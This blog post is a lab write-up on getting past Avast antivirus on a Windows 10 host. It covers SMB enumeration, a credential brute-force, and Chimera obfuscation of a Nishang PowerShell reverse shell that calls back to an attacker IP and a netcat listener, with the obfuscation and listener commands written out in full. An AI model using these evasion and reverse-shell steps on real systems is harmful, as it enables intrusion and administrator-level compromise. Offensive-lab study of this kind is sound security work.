---
layout: post
date: 2024-02-22
title: "ObFuSCaTInG AvASt"
categories: []
tags: []
---

Greetings! I was bored so I decided to see how hard it would be to bypass a simple home antivirus. I googled "free antivirus" and the first thing that popped-up was [Avast](https://www.avast.com/en-us/index#pc). I installed the x64 executable on an updated Windows 10 Pro system (Note: This is a completely default install. I did not mess with any settings). I wanted to do this in a lab environment where I achieve access prior to trying to get around the antivirus. A screenshot confirming the antivirus is running can be seen below.

![Image of Avast showing the Windows PC is protected.](/assets/img/Obfuscating_Avast/Protected_Avast_Screenshot.png)

This lab environment is simply a Windows 10 Pro box with some professional modifications and an Attack Host (Kali Linux) on the same private network. Initially, I started an NMAP scan to enumerate the host.
![Screenshot of NMAP command against Windows 10 Host](/assets/img/Obfuscating_Avast/NMAP_Scan_Screenshot.png)

As seen in the screenshot above, SMB (Port 445) is running. To enumerate SMB, I used smbclient to successfully authenticate with the '-N' (no username/password) option. 
![Screenshot of SMBClient listing with null session to see shared drives](/assets/img/Obfuscating_Avast/SMBClient_List_Screenshot.jpeg)
Following successful connection, I attempted to place a file without a username and password. This attempt failed due to security settings as seen in the screenshot below. 

![Screenshot of SMBClient failing to put a file](/assets/img/Obfuscating_Avast/SMBClient_Put_Screenshot.jpeg)

The earlier screenshot had a comment from "lemon" - so let's try to brute-force credentials for username "lemon". The [Netexec](https://github.com/Pennyw0rth/NetExec) tool
![Netexec Brute-force for SMB screenshot](/assets/img/Obfuscating_Avast/Netexec_Brute_Force.jpeg)

We find credentials for `lemon:CHOCOLATE`
Then we can authenticate and attempt to place a reverse shell script [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

![Attempt to place a shell in the SMB share](/assets/img/Obfuscating_Avast/SMBClient_placing_shell.jpeg)

The reverse shell gets stuck uploading in the previous image. Swapping over to the Windows 10 host, there is a Warning from AVAST that quarantined the reverse shell as it was uploaded. 
![Warning from AVAST for Reverse Shell](/assets/img/Obfuscating_Avast/AVAST_Reverse_Shell_warning.jpeg)

Avast was likely able to detect a threat here because [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) is a seven year-old reverse shell script with around 8,000 stars on Github. Although this script isn't necessarily malware, it definitely isn't a script an administrator would commonly use. Thus, it is classified as a PUP (Potentially Unwanted Program) and blocked.

My initial thought to evade detection is to obfuscate the script. Through my professional Googling I was able to find a script called [Chimera](https://github.com/tokyoneon/Chimeramade) made  by [TokyoNeon](https://x.com/tokyoneon_?s=20).

>Chimera is a (shiny and very hack-ish) PowerShell obfuscation script designed to bypass AMSI and antivirus solutions. It digests malicious PS1's known to trigger AV and uses string substitution and variable concatenation to evade common detection signatures.

So, I cloned the repository and adjusted the last line in the reverse shell in `shells/Invoke-PowerShellTcp.ps1` to: 

```
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.175 -Port 8080
```

Once that is saved, I ran the script `chimera.sh` with options provided from `README.md`:

```
./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /home/kali/NotAVirus.ps1 -v -t powershell,windows,\
copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\
invoke-expression,out-string,write-error -j -g -k -r -p
```

This obfuscates the script and places it in the home directory. Next, I started a listener on my host:

```
nc -lnvp 8080
```
Let's test. I uploaded the script via smbclient using lemon's credentials as we did before.  

![Successfully uploading Virus file to Windows Host - Also, why are you reviewing my source code?](/assets/img/Obfuscating_Avast/Uploading_Virus_Successfully.jpeg)

After waiting for a few minutes for the script to automatically execute, the netcat listener receives a connection back from the Windows host.

![Connection recieved from the reverse shell screenshot](/assets/img/Obfuscating_Avast/Reverse_Shell_Recieved.png)

To test command execution, I issued `whoami /groups` which reveals the current user is an administrator.

![Output from the command "Whoami /groups"](/assets/img/Obfuscating_Avast/WHOAMI_GROUPS_SCREENSHOT.png)

Furthermore, I confirmed the connection was active in command prompt with `netstat` and Avast wasn't showing any alerts. I would assume this is because an outgoing connection via PowerShell isn't inherently malicious. If anything, this demonstration shows the downfalls of signature-based detections.

![Checking netstat in cmd prompt and Antivirus status](/assets/img/Obfuscating_Avast/Connection_Active_Protected_Screenshot.jpeg)

Issuing additional commands to confirm I have administrator privileges and the reverse shell works:

![Screenshot with additional commands in Administrator's home directory](/assets/img/Obfuscating_Avast/Confidential_Screenshot.jpeg)

This was a fun exercise to try and get around pesky AVs. Further documentation and reading on the obfuscation script can be found here:
I hope you enjoyed reading! 

Additional resources:

- [Null Byte website](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-bypass-virustotal-amsi-detection-signatures-with-chimera-0333967/)
- [Chimera Github Link](https://github.com/tokyoneon/Chimera)
- [Trend Micro ASMI bypass techniques](https://www.trendmicro.com/en_vn/research/22/l/detecting-windows-amsi-bypass-techniques.html)

